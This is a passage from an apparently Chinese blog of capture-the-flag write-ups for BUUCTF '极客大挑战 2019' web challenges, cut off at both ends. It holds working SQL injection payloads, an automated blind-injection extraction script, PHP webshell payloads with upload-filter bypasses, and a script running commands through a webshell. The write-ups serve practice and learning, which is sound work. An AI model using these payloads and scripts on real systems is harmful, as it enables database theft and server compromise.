class="string">&#x27;geek&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))#</span><br><span class="line">表名为H4rDsq1</span><br><span class="line">password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>H4rDsq1<span class="string">&#x27;)),0x7e),1))#</span></span><br><span class="line"><span class="string">列名为id,username,password</span></span><br><span class="line"><span class="string">password=1&#x27;</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span>(password)<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))#</span><br><span class="line">但是只出来一半的flag，使用substr(被ban)，<span class="keyword">left</span>,<span class="keyword">right</span>解决,flag&#123;<span class="number">1017</span>f607<span class="number">-85</span>ef<span class="number">-46</span>d4<span class="number">-8</span>d03<span class="number">-04</span></span><br><span class="line">password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)),0x7e),1))#</span></span><br><span class="line"><span class="string">获得右边一半7-85ef-46d4-8d03-04400211b36b&#125;，拼接</span></span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>题目提示要找到第六个代码，并且在url中有id</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250114160424856.png" alt="image-20250114160424856"><br>结合题目提示使用盲注，尝试对id进行布尔盲注，这里要涉及到异或，两个数相同返回0，不同返回1</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">^</span><span class="number">1</span>           #报错</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">^</span><span class="number">0</span>           #id为<span class="number">1</span>的页面      </span><br><span class="line">即后面的数字为注入点</span><br><span class="line">尝试payload</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">^</span>(substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;g&#x27;</span>)      #报错</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">^</span>(substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>)      #id为<span class="number">1</span>的页面</span><br><span class="line">可正常布尔盲注，脚本如下(由于最后的一排数据过多，对force3函数优化，查询后停<span class="number">0.1</span>秒，能有效避免请求过多，且上限提升至<span class="number">600</span>,所以把每个都增加了查询后停<span class="number">0.1</span>秒)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force</span>(<span class="params">url</span>):</span><br><span class="line">    find=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">      found_char=<span class="literal">False</span></span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):<span class="comment">#根据需要更改字典</span></span><br><span class="line">         payload = &#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">f&quot;1^(ascii(substr(database(),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>)&quot;</span>&#125;   </span><br><span class="line">         r = requests.get(url=url,params=payload).text</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">if</span>(<span class="string">&#x27;ERROR&#x27;</span> <span class="keyword">in</span> r):</span><br><span class="line">            find += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(find)</span><br><span class="line">            found_char = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符，库名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> find</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force1</span>(<span class="params">url</span>):</span><br><span class="line">    find=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">      found_char=<span class="literal">False</span></span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):<span class="comment">#根据需要更改字典</span></span><br><span class="line">         payload = &#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">f&quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;<span class="subst">&#123;database&#125;</span>&#x27;)),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>)&quot;</span>&#125;   </span><br><span class="line">         r = requests.get(url=url,params=payload).text</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">if</span>(<span class="string">&#x27;ERROR&#x27;</span> <span class="keyword">in</span> r):</span><br><span class="line">            find += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(find)</span><br><span class="line">            found_char = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符，表名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span>   </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force2</span>(<span class="params">url</span>):</span><br><span class="line">    find=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">      found_char=<span class="literal">False</span></span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):<span class="comment">#根据需要更改字典</span></span><br><span class="line">         payload = &#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">f&quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;<span class="subst">&#123;table&#125;</span>&#x27;)),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>)&quot;</span>&#125;   </span><br><span class="line">         r = requests.get(url=url,params=payload).text</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">if</span>(<span class="string">&#x27;ERROR&#x27;</span> <span class="keyword">in</span> r):</span><br><span class="line">            find += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(find)</span><br><span class="line">            found_char = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符，列名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force3</span>(<span class="params">url</span>):</span><br><span class="line">    find=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">600</span>):</span><br><span class="line">      found_char=<span class="literal">False</span></span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):<span class="comment">#根据需要更改字典</span></span><br><span class="line">         payload = &#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">f&quot;1^(ascii(substr((select(group_concat(<span class="subst">&#123;column&#125;</span>))from(<span class="subst">&#123;table&#125;</span>)),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>)&quot;</span>&#125;</span><br><span class="line">         r = requests.get(url=url,params=payload).text</span><br><span class="line">         time.sleep(<span class="number">0.1</span>)</span><br><span class="line">         <span class="keyword">if</span>(<span class="string">&#x27;ERROR&#x27;</span> <span class="keyword">in</span> r):</span><br><span class="line">            find += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(find)</span><br><span class="line">            found_char = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符，flag为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   <span class="comment">#指定url</span></span><br><span class="line">   url=<span class="string">&#x27;http://71344066-f916-483f-a15a-230ea9111242.node5.buuoj.cn:81/search.php&#x27;</span></span><br><span class="line">   database=force(url)</span><br><span class="line">   force1(url)</span><br><span class="line">   table=<span class="built_in">input</span>(<span class="string">&quot;请输入表名:&quot;</span>)</span><br><span class="line">   force2(url)</span><br><span class="line">   column=<span class="built_in">input</span>(<span class="string">&quot;请输入列名:&quot;</span>)</span><br><span class="line">   force3(url)</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250114165803654.png" alt="image-20250114165803654"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250114165812301.png" alt="image-20250114165812301"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250114170056828.png" alt="image-20250114170056828"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250114185819288.png" alt="image-20250114185819288"></p><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>页面没啥找的就先看原码，看到注释部分提示GET传参cat&#x3D;dog，传参后获得flag</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250114010028607.png" alt="image-20250114010028607"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250114010145776.png" alt="image-20250114010145776"></p><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>打开页面没什么信息，在源码中找到Secret.php页面</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250114191647807.png" alt="image-20250114191647807"></p><p>访问提示不是来自<code>https://Sycsecret.buuoj.cn</code>，即涉及到referer伪造，参考<a href="https://yxing-1.github.io/2025/01/14/%E8%AF%A6%E8%A7%A3%E8%AF%B7%E6%B1%82%E5%A4%B4%E4%BF%A1%E6%81%AF/">详解请求头信息</a></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250114191714414.png" alt="image-20250114191714414"></p><p>抓包在bp重发器中伪造referer后如下</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250114192249528.png" alt="image-20250114192249528"></p><p>提示用”Syclover” browser，将UA更换为Syclover后重发如下</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250114192458641.png" alt="image-20250114192458641"></p><p>提示只能本地使用，那就通过X-Forwarded-For来伪造</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250114192843378.png" alt="image-20250114192843378"></p><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><h2 id="基础解法"><a href="#基础解法" class="headerlink" title="基础解法"></a>基础解法</h2><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250114193146754.png" alt="image-20250114193146754"></p><p>进入环境就看到一句话木马，直接通过蚁剑连接即可</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250114193503087.png" alt="image-20250114193503087"></p><hr><p>后面看了其他师傅的wp，发现这个题思路还有很多，以下再提供两个大佬的其他思路，可参考原文[士别三日wyx](<a href="https://blog.csdn.net/wangyuxiang946/article/details/121023808?ops_request_misc=%7B%22request_id%22:%22171075928816800182711393%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=171075928816800182711393&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-121023808-null-null.142%5Ev99%5Epc_search_result_base7&utm_term=%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98">https://blog.csdn.net/wangyuxiang946/article/details/121023808?ops_request_misc=%7B%22request%5Fid%22%3A%22171075928816800182711393%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=171075928816800182711393&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-121023808-null-null.142^v99^pc_search_result_base7&amp;utm_term=[极客大挑战</a> 2019]Knife&amp;spm&#x3D;1018.2226.3001.4187)和[Senimo_](<a href="https://blog.csdn.net/weixin_44037296/article/details/109151169?ops_request_misc=%7B%22request_id%22:%22171075928816800182711393%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=171075928816800182711393&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-109151169-null-null.142%5Ev99%5Epc_search_result_base7&utm_term=%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98">https://blog.csdn.net/weixin_44037296/article/details/109151169?ops_request_misc=%7B%22request%5Fid%22%3A%22171075928816800182711393%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=171075928816800182711393&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-109151169-null-null.142^v99^pc_search_result_base7&amp;utm_term=[极客大挑战</a> 2019]Knife&amp;spm&#x3D;1018.2226.3001.4187)</p><h2 id="进阶解法一"><a href="#进阶解法一" class="headerlink" title="进阶解法一"></a>进阶解法一</h2><p>一句话木马本身是利用代码执行的函数进行运行，说的简单点就是你的post请求传入eval()中，那也就是说，我们可以修改Post请求的参数来执行代码！</p><p>打开hackbar执行：</p><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">Syc=phpinfo()<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>可以直接进入展示PHP信息界面：</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250116173819465.png" alt="image-20250116173819465"></p><p>这里很多人有疑问了，为什么要进入这里呢，因为在这个phpinfo界面下是无任何过滤的，这也是为什么，大多数网站的题目都要禁止或者加密不让访问这个界面，接下来进入下一步：</p><p>我们使用var_dump()+scandir()查看一下根目录：</p><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">Syc=var_dump(<span class="name">scandir</span>(&#x27;/&#x27;))<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>看起来无变化，但是只是由于背景颜色遮挡，直接看源码</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250116174019673.png" alt="image-20250116174019673"></p><p>可以看到flag文件夹了，ctf有一个不成文的规矩就是要么不出flag字符，要么出现flag就在这里边！</p><p>那就访问下就好，使用vay_dump+file_get_contents()查看文件就还好了：</p><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">Syc=var_dump(<span class="name">file_get_contents</span>(&#x27;/flag&#x27;))<span class="comment">;</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250116174104875.png" alt="image-20250116174104875"></p><p>在源码中就可以找到flag</p><p>这里引用大佬的一段话</p><p><strong>喜欢一个东西首先要先学会「尊重」，虽然网络安全的圈子不乏各种灰产，以及高调宣传自己是黑客的脚本小子，但不可否认，这个圈子仍有不少人保持着「举世皆浊我独清，众人皆醉我独醒」的心态，努力磨砺技术，提升自身修养，让互联网变得更加安全。</strong></p><h2 id="进阶解法二"><a href="#进阶解法二" class="headerlink" title="进阶解法二"></a>进阶解法二</h2><p>连接一句木马并使用SHELL，需要将一句话木马作为POST传值的参数，将PHP语句作为值传入，并通过PHP语句执行SHELL命令。</p><p>我们剖析一下菜刀的原理，先看下菜刀发送的数据包：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">op=@eval(base64_decode($_POST[attack]));&amp;attack=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOztwcmludCgiaGVsbG8gUEhQISIpOztlY2hvKCJ8PC0iKTtkaWUoKTs=</span><br></pre></td></tr></table></figure><p><code>op=@eval(base64_decode($_POST[attack]));</code>为正常的一句话木马，其通过POST方式传参，参数名为attack<br>base64_decode()函数解码了传入的值<br>因为对传入的值进行BASE64编码可以有效的防止特殊字符传输失败的异常。<br>把值进行BASE64解码，得到：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;); @set_time_limit(0); @set_magic_quotes_runtime(0); echo(&quot;-&gt;|&quot;);; print(&quot;hello PHP!&quot;);; echo(&quot;|&lt;-&quot;); die();</span><br></pre></td></tr></table></figure><p>首先进行测试，hackbar传参可获得回显<br><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250116174518979.png" alt="image-20250116174518979"></p><p>因此直接搬运脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># name: Meng</span></span><br><span class="line"><span class="comment"># mail: 614886708@qq.com</span></span><br><span class="line"><span class="comment"># ctf_exp06：BUUCTF [极客大挑战 2019] Knife</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Knife</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, url_input</span>):</span><br><span class="line">        <span class="variable language_">self</span>.payload_data = &#123;<span class="string">&quot;Syc&quot;</span>: <span class="string">&quot;exec(&#x27;cat /flag&#x27;,$out);print_r($out);die();&quot;</span>&#125;</span><br><span class="line">        <span class="variable language_">self</span>.status_code = <span class="number">1</span>        <span class="comment"># 链接状态：0：无效，1：连通</span></span><br><span class="line">        <span class="variable language_">self</span>.url = url_input.strip()</span><br><span class="line">        <span class="variable language_">self</span>.flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">url_test</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 可以重复输错10次链接</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># 对输入的url做判断</span></span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>.url.endswith(<span class="string">&#x27;/index.php&#x27;</span>) <span class="keyword">or</span> <span class="variable language_">self</span>.url.endswith(<span class="string">&#x27;buuoj.cn/&#x27;</span>) <span class="keyword">or</span> <span class="variable language_">self</span>.url.endswith(<span class="string">&#x27;buuoj.cn&#x27;</span>):</span><br><span class="line">                    <span class="comment"># 尝试访问链接是否为200</span></span><br><span class="line">                    requests.get(<span class="variable language_">self</span>.url)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;测试状态： 200  &#x27;</span> + <span class="variable language_">self</span>.url)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;无效链接！请重新输入！&#x27;</span>)</span><br><span class="line">                <span class="variable language_">self</span>.url = <span class="built_in">input</span>(<span class="string">&#x27;请输入题目链接：&#x27;</span>)</span><br><span class="line">                <span class="variable language_">self</span>.status_code = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="variable language_">self</span>.status_code = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.status_code == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;无效链接！退出程序！&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">num_test</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 设置获取flag只能重复30次</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = requests.post(<span class="variable language_">self</span>.url, data=<span class="variable language_">self</span>.payload_data)</span><br><span class="line"> </span><br><span class="line">                <span class="comment"># 匹配buuctf平台flag格式</span></span><br><span class="line">                <span class="variable language_">self</span>.flag = re.search(<span class="string">r&#x27;flag\&#123;.+\&#125;&#x27;</span>, r.text).group()</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;第 &#x27;</span> + <span class="built_in">str</span>(i+<span class="number">1</span>) + <span class="string">&#x27; 次未获取到flag！ 正在重试！&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.url_test()     <span class="comment"># 连接测试</span></span><br><span class="line">        <span class="variable language_">self</span>.num_test()     <span class="comment"># flag获取</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.flag == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;已尝试30次！未获取到flag! 退出程序！&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.flag</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ctf_exp0: BUUCTF [极客大挑战 2019] Knife&#x27;</span>)</span><br><span class="line">    url_input = <span class="built_in">input</span>(<span class="string">&#x27;请输入题目链接：&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(Knife(url_input).run())</span><br><span class="line">    <span class="built_in">input</span>()  <span class="comment"># 防止退出cmd</span></span><br></pre></td></tr></table></figure><p>同样可以获得flag</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250116174719694.png" alt="image-20250116174719694"></p><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>源码中发现<code>pay.php</code>,进入后再次在源码中找到注释内容</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250116154421464.png" alt="image-20250116154421464"></p><p>即password传参为404且不全为数字(弱比较)，即传404a都行</p><p>在pay.php页面中发现提示必须以学生身份购买flag，发现cookie中有user&#x3D;0，尝试改为1</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250116155348907.png" alt="image-20250116155348907"></p><p>提示还需要pay，因此传money&#x3D;100000000，提示数字过长，使用科学计数法获得flag</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250116155500321.png" alt="image-20250116155500321"></p><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>写含一句话木马<code>&lt;?php eval($POST[&#39;123&#39;]);?&gt;</code>的php文件尝试上传</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250116160408869.png" alt="image-20250116160408869"></p><p>显示不是图片文件，直接抓包修改后缀为image&#x2F;jpeg判断是否是客户端验证</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250116160628726.png" alt="image-20250116160628726"></p><p>返回<code>not php</code>，说明成功绕过文件类型限制，但是还是要对文件内容进行检测，将文件内容改为</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript">@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;123&#x27;</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将后缀改为phtml可绕过php限制(绕过后缀的有文件格式有php,php3,php4,php5,phtml.pht)</p><p>还是提示不是上传的图片文件，因此通过伪造jpg文件头成功上传，前面加上<code>GIF89a</code>，这个可以伪造成jpg格式的文件。</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250116161855456.png" alt="image-20250116161855456"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250116162113948.png" alt="image-20250116162113948"></p><p>上传成功后就要找到保存路径通过蚁剑连接,一般保存在&#x2F;upload下</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250116162346128.png" alt="image-20250116162346128"></p><p>成功找到该文件，通过蚁剑连接，注意蚁剑url地址为url&#x2F;upload&#x2F;filename</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250116162834596.png" alt="image-20250116162834596"></p><p>在根目录下找到flag</p><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>根据题目先在源码中找到&#x2F;Archive_room.php，访问secret后发现直接跳转到end.php中，并且显示查阅结束，因此抓包重新看过程</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250116164803864.png" alt="image-20250116164803864"></p><p>发现注释了<code>secr3t.php</code>,bp访问得下图，即文件包含漏洞</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250116164855835.png" alt="image-20250116164855835"></p><p>源码如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||<span class="title function_ 